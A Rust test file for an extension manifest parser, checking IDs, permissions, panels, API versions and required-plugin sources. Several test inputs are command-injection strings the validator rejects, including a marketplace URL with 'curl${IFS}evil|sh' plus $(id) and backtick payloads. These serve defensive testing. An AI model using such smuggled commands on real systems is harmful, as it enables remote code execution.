use std::path::{Path, PathBuf};
use wai_ext::*;

const FULL: &str = include_str!("fixtures/full.toml");
const DIR: &str = "/ext/go-tools";

fn parse(t: &str) -> Result<Manifest, ManifestError> {
    parse_manifest(t, Path::new(DIR))
}

#[test]
fn parses_full_manifest() {
    let m = parse(FULL).unwrap();
    assert_eq!(m.id.as_str(), "go-tools");
    assert_eq!(m.description.as_deref(), Some("Go helpers"));
    assert_eq!(m.process.as_ref().unwrap().args, ["--stdio"]);
    assert!(
        m.permissions
            .contains(&Permission::Fs(PathBuf::from("docs")))
    );
    assert!(m.permissions.contains(&Permission::SessionsControl));
    let c = &m.contributes;
    assert_eq!(c.templates[0].name, "Review");
    assert_eq!(c.commands.len(), 2);
    assert_eq!(c.agents[0].command, "bin/agent");
    assert_eq!(
        c.mcp_servers[0].env,
        [("TOKEN".to_string(), "x".to_string())]
    );
    assert_eq!(c.panels[0].id, "main");
    assert_eq!(c.claude_plugins, ["plug-a"]);
    assert_eq!(c.themes, ["themes/dark.json"]);
    assert_eq!(
        m.requires.claude_plugins,
        [RequiredPlugin {
            name: "plug-b".into(),
            marketplace: "acme/plugins".into()
        }]
    );
}

fn with(id: &str, command: &str, perms: &str) -> String {
    format!(
        "id = \"{id}\"\nname = \"n\"\nversion = \"1\"\npermissions = [{perms}]\n[process]\ncommand = \"{command}\"\n"
    )
}

#[test]
fn manifest_rejects_bad_ids_and_paths() {
    for id in ["../x", "A_B", "", "-a", &"a".repeat(64)] {
        assert!(
            matches!(
                parse(&with(id, "node", "\"process\"")),
                Err(ManifestError::BadId(_))
            ),
            "{id}"
        );
    }
    assert!(parse(&with(&"a".repeat(63), "node", "\"process\"")).is_ok());
    for cmd in ["/bin/sh", "../x", "bin/../../x", "a/../.."] {
        assert!(
            matches!(
                parse(&with("ok", cmd, "\"process\"")),
                Err(ManifestError::EscapingPath(_))
            ),
            "{cmd}"
        );
    }
    assert!(parse(&with("ok", "bin/../tool", "\"process\"")).is_ok());
    assert!(parse(&with("ok", "node", "\"process\"")).is_ok());
    assert!(matches!(
        parse(&with("ok", "node", "")),
        Err(ManifestError::MissingPermission(Permission::Process))
    ));
}

#[test]
fn agent_and_mcp_paths_checked() {
    let a = "id=\"a\"\nname=\"n\"\nversion=\"1\"\npermissions=[\"process\"]\n[[contributes.agents]]\nname=\"x\"\ncommand=\"/bin/sh\"\n";
    assert!(matches!(parse(a), Err(ManifestError::EscapingPath(_))));
    let m = "id=\"a\"\nname=\"n\"\nversion=\"1\"\npermissions=[\"process\"]\n[[contributes.mcp_servers]]\nname=\"x\"\ncommand=\"../m\"\n";
    assert!(matches!(parse(m), Err(ManifestError::EscapingPath(_))));
}

#[test]
fn prompt_only_command_needs_no_process() {
    let ok = "id=\"a\"\nname=\"n\"\nversion=\"1\"\n[[contributes.commands]]\nid=\"c\"\ntitle=\"C\"\nprompt=\"hi\"\n";
    assert!(parse(ok).is_ok());
    let none =
        "id=\"a\"\nname=\"n\"\nversion=\"1\"\n[[contributes.commands]]\nid=\"c\"\ntitle=\"C\"\n";
    assert!(matches!(parse(none), Err(ManifestError::Unknown(_))));
}

#[test]
fn panels_require_permission() {
    let t = "id=\"a\"\nname=\"n\"\nversion=\"1\"\n[[contributes.panels]]\nid=\"p\"\ntitle=\"P\"\n";
    assert!(matches!(
        parse(t),
        Err(ManifestError::MissingPermission(Permission::Panels))
    ));
}

#[test]
fn unknown_fields_and_permissions_rejected() {
    assert!(matches!(
        parse(&format!("{FULL}\nbogus = 1\n")),
        Err(ManifestError::Parse(_))
    ));
    let t = "id=\"a\"\nname=\"n\"\nversion=\"1\"\n[contributes]\nbogus=[]\n";
    assert!(matches!(parse(t), Err(ManifestError::Parse(_))));
    let p = "id=\"a\"\nname=\"n\"\nversion=\"1\"\npermissions=[\"root\"]\n";
    assert!(matches!(parse(p), Err(ManifestError::Unknown(_))));
}

#[test]
fn agents_and_mcp_require_process_permission() {
    let a =
        "id=\"a\"\nname=\"n\"\nversion=\"1\"\n[[contributes.agents]]\nname=\"x\"\ncommand=\"go\"\n";
    let m = "id=\"a\"\nname=\"n\"\nversion=\"1\"\n[[contributes.mcp_servers]]\nname=\"x\"\ncommand=\"go\"\n";
    for t in [a, m] {
        assert!(matches!(
            parse(t),
            Err(ManifestError::MissingPermission(Permission::Process))
        ));
        let ok = t.replace("[[", "permissions=[\"process\"]\n[[");
        assert!(parse(&ok).is_ok());
    }
}

#[test]
fn template_typos_rejected() {
    let t =
        "id=\"a\"\nname=\"n\"\nversion=\"1\"\n[[contributes.templates]]\nname=\"t\"\nagnet=\"x\"\n";
    assert!(matches!(parse(t), Err(ManifestError::Parse(_))));
}

#[test]
fn fs_permission_edges_nul_and_nested_unknown() {
    let h = "id=\"a\"\nname=\"n\"\nversion=\"1\"\n";
    for p in ["fs:", "fs:/etc", "fs:../x"] {
        let r = parse(&format!("{h}permissions=[\"{p}\"]\n"));
        assert!(
            matches!(&r, Err(ManifestError::Unknown(m)) if !m.contains("program")),
            "{p}"
        );
    }
    assert!(parse(&format!("{h}permissions=[\"fs:docs\"]\n")).is_ok());
    assert!(parse(&with("ok", "no\\u0000de", "\"process\"")).is_err());
    assert!(parse(&format!("{h}permissions=[\"fs:a\\u0000b\"]\n")).is_err());
    let p = format!("{h}permissions=[\"process\"]\n[process]\ncommand=\"go\"\nbogus=1\n");
    assert!(matches!(parse(&p), Err(ManifestError::Parse(_))));
    let c = format!("{h}[[contributes.commands]]\nid=\"c\"\ntitle=\"C\"\nprompt=\"p\"\nbogus=1\n");
    assert!(matches!(parse(&c), Err(ManifestError::Parse(_))));
}

/// The first-party extensions in `extensions/` follow the same rules as any other.
#[test]
fn first_party_manifests_validate() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../extensions");
    let read = |id: &str| {
        let dir = root.join(id);
        let text = std::fs::read_to_string(dir.join(MANIFEST_FILE)).unwrap();
        parse_manifest(&text, &dir).unwrap()
    };

    // wai-navegador: manifest-only; Playwright's MCP server through npx, at an exact version.
    let nav = read("wai-navegador");
    assert!(nav.process.is_none());
    assert_eq!(nav.permissions, [Permission::Process, Permission::Network]);
    let [mcp] = nav.contributes.mcp_servers.as_slice() else {
        panic!("one MCP server: {nav:?}")
    };
    assert_eq!(
        (mcp.name.as_str(), mcp.command.as_str()),
        ("playwright", "npx")
    );
    // `--prefix=/`: npx ignores the project folder's `.npmrc` and `node_modules`.
    let [prefix, yes, package] = mcp.args.as_slice() else {
        panic!("{:?}", mcp.args)
    };
    let version = package.strip_prefix("@playwright/mcp@").unwrap_or_default();
    let exact =
        version.split('.').count() == 3 && version.split('.').all(|n| n.parse::<u32>().is_ok());
    assert!(
        prefix == "--prefix=/" && yes == "-y" && exact,
        "pinned: {package}"
    );

    // wai-rotinas: its own process, a panel and notifications.
    let rotinas = read("wai-rotinas");
    assert_eq!(
        rotinas.permissions,
        [Permission::Process, Permission::Notify, Permission::Panels]
    );
    assert_eq!(rotinas.process.unwrap().command, "bin/wai-rotinas");
    assert_eq!(rotinas.contributes.panels[0].id, "rotinas");

    // wai-bichinho: a pet in the prompt box, and its card in the sidebar.
    let pet = read("wai-bichinho");
    assert_eq!(
        pet.permissions,
        [
            Permission::Process,
            Permission::Panels,
            Permission::SessionsRead,
            Permission::Events(ExtId::new("wai-waycarbon").unwrap())
        ]
    );
    let [slot, card] = pet.contributes.panels.as_slice() else {
        panic!("two panels: {:?}", pet.contributes.panels)
    };
    assert_eq!(
        (slot.location, slot.width),
        (PanelLocation::Prompt, Some(160))
    );
    assert_eq!((card.location, card.width), (PanelLocation::Sidebar, None));

    // wai-remoto: a skeleton; no process, nothing contributed.
    let remoto = read("wai-remoto");
    assert!(remoto.process.is_none());
    assert_eq!(remoto.permissions, [Permission::SessionsControl]);
    assert_eq!(remoto.contributes, Contributes::default());
}

#[test]
fn panel_icon_and_location() {
    let h = "id=\"a\"\nname=\"n\"\nversion=\"1\"\npermissions=[\"panels\"]\n";
    let panel = |fields: &str| {
        parse(&format!(
            "{h}[[contributes.panels]]\nid=\"p\"\ntitle=\"P\"\n{fields}"
        ))
    };
    let p = panel("").unwrap().contributes.panels.remove(0);
    assert_eq!((p.icon, p.location), (None, PanelLocation::Sidebar));
    let p = panel("icon=\"git-pull-request\"\nlocation=\"main\"\n").unwrap();
    let p = &p.contributes.panels[0];
    assert_eq!(p.icon.as_deref(), Some("git-pull-request"));
    assert_eq!(p.location, PanelLocation::Main);
    assert!(panel("location=\"sidebar\"\n").is_ok());
    assert!(matches!(
        panel("location=\"top\"\n"),
        Err(ManifestError::Parse(_))
    ));
    assert!(matches!(panel("icon=3\n"), Err(ManifestError::Parse(_))));

    // Prompt panels: a width, and one per prompt location.
    let p = panel("location=\"prompt\"\nwidth=150\n").unwrap();
    let p = &p.contributes.panels[0];
    assert_eq!((p.location, p.width), (PanelLocation::Prompt, Some(150)));
    assert!(p.location.in_prompt());
    let p = panel("location=\"prompt-side\"\n").unwrap();
    assert_eq!(p.contributes.panels[0].location, PanelLocation::PromptSide);
    assert!(matches!(
        panel("location=\"main\"\nwidth=150\n"),
        Err(ManifestError::Unknown(_))
    ));
    let two = |a: &str, b: &str| {
        parse(&format!(
            "{h}[[contributes.panels]]\nid=\"a\"\ntitle=\"A\"\nlocation=\"{a}\"\n\
             [[contributes.panels]]\nid=\"b\"\ntitle=\"B\"\nlocation=\"{b}\"\n"
        ))
    };
    assert!(two("prompt", "prompt-side").is_ok());
    assert!(two("main", "main").is_ok());
    assert!(matches!(
        two("prompt", "prompt"),
        Err(ManifestError::Unknown(_))
    ));
    assert!(!panel("").unwrap().contributes.panels[0].wide);
    assert!(panel("wide=true\n").unwrap().contributes.panels[0].wide);
    let wide_main = panel("wide=true\nlocation=\"main\"\n").unwrap_err();
    assert!(wide_main.to_string().contains("wide"), "{wide_main}");
}

#[test]
fn api_version_is_checked_first() {
    let with_api = |api: &str, rest: &str| parse(&format!("api = {api}\n{FULL}{rest}"));
    assert!(with_api("\"1.0\"", "").is_ok());
    assert!(with_api("\"1.2\"", "").is_ok());
    let body = item("prs", "bottom", "P");
    assert!(items("\"bar\"", &format!("api=\"1.3\"\n{body}")).is_ok());
    assert!(with_api("\"0.9\"", "").is_ok());
    assert!(with_api(&format!("\"{API}\""), "").is_ok());
    assert!(with_api("\"1.4\"", "").is_ok());
    assert!(with_api("\"1.5\"", "").is_ok());
    assert!(with_api("\"1.6\"", "").is_ok());
    assert!(with_api("\"1.7\"", "").is_ok());
    let newer = with_api("\"1.8\"", "").unwrap_err();
    assert_eq!(
        newer.to_string(),
        "Go Tools needs a newer wai (extension API 1.8; this wai has 1.7)"
    );
    // Even when the newer API's fields would fail the strict parse.
    assert_eq!(
        with_api("\"2.0\"", "\nfuture = true\n")
            .unwrap_err()
            .to_string(),
        "Go Tools needs a newer wai (extension API 2.0; this wai has 1.7)"
    );
    // Numeric, not lexical: 1.10 is newer than 1.2.
    assert!(matches!(
        with_api("\"1.10\"", ""),
        Err(ManifestError::TooOld { .. })
    ));
    for bad in [
        "\"1\"",
        "\"x.y\"",
        "\"1.2.3\"",
        "\"+1.2\"",
        "\"1.\"",
        "1.2",
        "\"\"",
    ] {
        assert!(
            matches!(with_api(bad, ""), Err(ManifestError::Parse(_))),
            "{bad}"
        );
    }
}

const HEAD: &str = "id=\"a\"\nname=\"n\"\nversion=\"1\"\n";

fn items(perms: &str, body: &str) -> Result<Manifest, ManifestError> {
    parse(&format!("{HEAD}permissions=[{perms}]\n{body}"))
}

fn item(id: &str, bar: &str, title: &str) -> String {
    format!("[[contributes.items]]\nid=\"{id}\"\nbar=\"{bar}\"\ntitle=\"{title}\"\n")
}

#[test]
fn items_parse() {
    let body = item("prs", "bottom", "Pull requests") + &item("ci", "top", "CI");
    let m = items("\"bar\"", &format!("api=\"1.2\"\n{body}")).unwrap();
    assert_eq!(
        m.contributes.items,
        vec![
            ItemSpec {
                id: "prs".into(),
                bar: Bar::Bottom,
                title: "Pull requests".into()
            },
            ItemSpec {
                id: "ci".into(),
                bar: Bar::Top,
                title: "CI".into()
            }
        ]
    );
    assert!(m.permissions.contains(&Permission::Bar));
}

#[test]
fn items_need_bar() {
    assert!(matches!(
        items("", &item("prs", "bottom", "P")),
        Err(ManifestError::MissingPermission(Permission::Bar))
    ));
}

#[test]
fn items_are_capped() {
    let body: String = (0..4).map(|i| item(&format!("i{i}"), "top", "T")).collect();
    let Err(ManifestError::Unknown(s)) = items("\"bar\"", &body) else {
        panic!("four items are too many");
    };
    assert_eq!(s, "at most 3 items, found 4");
}

#[test]
fn item_ids_are_unique() {
    let body = item("prs", "top", "A") + &item("prs", "bottom", "B");
    let Err(ManifestError::Unknown(s)) = items("\"bar\"", &body) else {
        panic!("a repeated id is invalid");
    };
    assert_eq!(s, "item id \"prs\" is declared twice");
}

#[test]
fn item_bar_is_top_or_bottom() {
    for body in [
        item("a", "left", "A"),
        item("a", "top", "A") + "priority=1\n",
    ] {
        assert!(matches!(
            items("\"bar\"", &body),
            Err(ManifestError::Parse(_))
        ));
    }
}

#[test]
fn required_plugins_parse() {
    let m = parse(&format!(
        "{}\n[[requires.claude_plugins]]\nname = \"waycarbon\"\nmarketplace = \"waycarbon/claude-code\"\n",
        with("x", "bin/x", "\"process\"")
    ))
    .unwrap();
    assert_eq!(
        m.requires.claude_plugins,
        [RequiredPlugin {
            name: "waycarbon".into(),
            marketplace: "waycarbon/claude-code".into()
        }]
    );
}

#[test]
fn required_plugins_are_checked() {
    let head = "id = \"x\"\nname = \"X\"\nversion = \"1\"\n";
    for (name, market) in [
        ("-x", "a/b"),
        ("a b", "a/b"),
        ("a@b", "a/b"),
        ("ok", "-a/b"),
        (".", "a/b"),
        ("..", "a/b"),
        ("...", "a/b"),
        ("ok", "./x"),
        ("ok", "../x"),
        ("ok", "a/.."),
        ("ok", ".../x"),
        ("ok", "a"),
        ("ok", "http://x/y"),
        ("ok", "https://x/ y"),
        ("ok", "https://x/y;curl${IFS}evil|sh"),
        ("ok", "https://x/y;z"),
        ("ok", "https://x/$(id)"),
        ("ok", "https://x/`id`"),
        ("ok", "https://x/y|z"),
        ("ok", "https://x/y&z"),
        ("ok", "https://x/y?z"),
        ("ok", "https://x/y#z"),
    ] {
        let toml = format!(
            "{head}[[requires.claude_plugins]]\nname = {name:?}\nmarketplace = {market:?}\n"
        );
        assert_eq!(
            parse(&toml).unwrap_err().to_string(),
            format!("invalid required Claude plugin {name} from {market}"),
            "{name} {market}"
        );
    }
    let git = "[[requires.claude_plugins]]\nname = \"p\"\n\
               marketplace = \"https://github.com/waycarbon/claude-code.git\"\n";
    assert!(parse(&format!("{head}{git}")).is_ok());
    let entry = "[[requires.claude_plugins]]\nname = \"p\"\nmarketplace = \"a/b\"\n";
    assert!(parse(&format!("{head}{}", entry.repeat(5))).is_ok());
    assert!(parse(&format!("{head}{}", entry.repeat(6))).is_err());
    assert!(parse(&format!("{head}[requires]\nother = 1\n")).is_err());
    assert!(parse(&format!("{head}{entry}extra = 1\n")).is_err());
}

#[test]
fn svg_icon_paths() {
    let spec = |icon: &str| PanelSpec {
        id: "p".into(),
        title: "P".into(),
        icon: Some(icon.into()),
        location: Default::default(),
        width: None,
        wide: false,
    };
    assert_eq!(spec("icon.svg").svg_icon(), Some(Path::new("icon.svg")));
    assert_eq!(
        spec("assets/w.svg").svg_icon(),
        Some(Path::new("assets/w.svg"))
    );
    assert_eq!(spec("../w.svg").svg_icon(), None);
    assert_eq!(spec("/tmp/w.svg").svg_icon(), None);
    assert_eq!(spec("database").svg_icon(), None);
}

#[test]
fn events_permission_names_one_extension() {
    let manifest = |perm: &str| {
        format!("id = \"pet\"\nname = \"Pet\"\nversion = \"1.0.0\"\npermissions = [\"{perm}\"]\n")
    };
    let m = parse_manifest(&manifest("events:wai-waycarbon"), Path::new("/x")).unwrap();
    let want = Permission::Events(ExtId::new("wai-waycarbon").unwrap());
    assert_eq!(m.permissions, std::slice::from_ref(&want));
    assert_eq!(want.to_string(), "events:wai-waycarbon");
    for bad in ["events:", "events:Bad_Id", "events:-x", "events:a/b"] {
        assert_eq!(
            parse_manifest(&manifest(bad), Path::new("/x"))
                .unwrap_err()
                .to_string(),
            format!("events permission {bad:?} must name an extension id")
        );
    }
}
